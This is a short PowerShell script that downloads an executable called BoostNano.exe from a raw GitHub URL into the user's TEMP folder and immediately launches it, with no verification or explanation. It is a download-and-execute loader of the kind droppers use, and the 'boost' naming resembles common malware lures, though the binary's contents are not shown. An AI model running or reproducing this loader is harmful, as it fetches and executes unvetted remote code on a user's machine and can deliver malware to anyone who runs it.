$url = "https://raw.githubusercontent.com/nxnoshop-afk/Nxnoshop-download/main/BoostNano.exe"
$temp = "$env:TEMP\BoostNano.exe"

Invoke-WebRequest -Uri $url -OutFile $temp
Start-Process $temp